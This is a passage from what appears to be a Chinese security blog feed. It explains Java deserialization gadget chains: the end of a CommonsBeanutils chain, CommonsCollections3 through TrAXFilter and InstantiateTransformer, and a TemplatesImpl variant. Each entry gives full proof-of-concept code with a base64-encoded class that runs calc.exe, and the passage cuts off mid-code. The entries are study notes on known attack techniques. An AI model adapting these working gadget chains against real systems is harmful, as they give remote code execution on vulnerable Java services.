class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>哈哈哈先水一下ROME，待会在来~~吃饭去了。</p>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection3</title>
    <link href="/2022/03/05/CommonCollection3/"/>
    <url>/2022/03/05/CommonCollection3/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>为什么有cc3，其实是cc1的<strong>InvokerTransformer</strong>被禁用了（无法被反序列化）。<br>那么这里cc3出现了<strong>TrAXFilter</strong></p><h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051051149.png" alt="QQ截图20220305105118"></p><p>这里就直接在其构造方法中使用了<strong>newTransformer()<strong>。一直跟进</strong>newTransformer（）</strong>会来到。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203589.png" alt="QQ截图20220305110525"></p><p>后续利用不久是<strong>TemplatesImpl</strong>了吗？</p><p>那么如何利用这个类呢？</p><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051101285.png" alt="QQ截图20220305110121"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203909.png" alt="QQ截图20220305110137"></p><p>在该类中的**transform()**里使用反射直接创建出一个实例。</p><p>那么这不就是可以直接不利用InvokerTransformer了？</p><h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = &#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>       &#125;;<br></code></pre></td></tr></table></figure><p>这里的功能相当于是实现了返回<strong>TrAXFilter</strong>类，然后通过 <strong>InstantiateTransformer</strong>实例化<strong>TrAXFilter</strong>类，然后就会调用其构造方法。从而调用**newTransformer()**。接着就是cc1的内容了。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>     <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>     objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections3（TemplatesImpl）</title>
    <link href="/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/"/>
    <url>/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3（TemplatesImpl）"><a href="#CommonsCollections3（TemplatesImpl）" class="headerlink" title="CommonsCollections3（TemplatesImpl）"></a>CommonsCollections3（TemplatesImpl）</h1><p>ysoserial用cc2是这种办法。这里就将就一下，用cc3来完成这个效果。本质上木有区别。想当于是<strong>TemplatesImpl+cc1的后半段</strong>。感觉会了，就不继续复习了。<strong>（这里还是利用了InvokerTransformer）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span 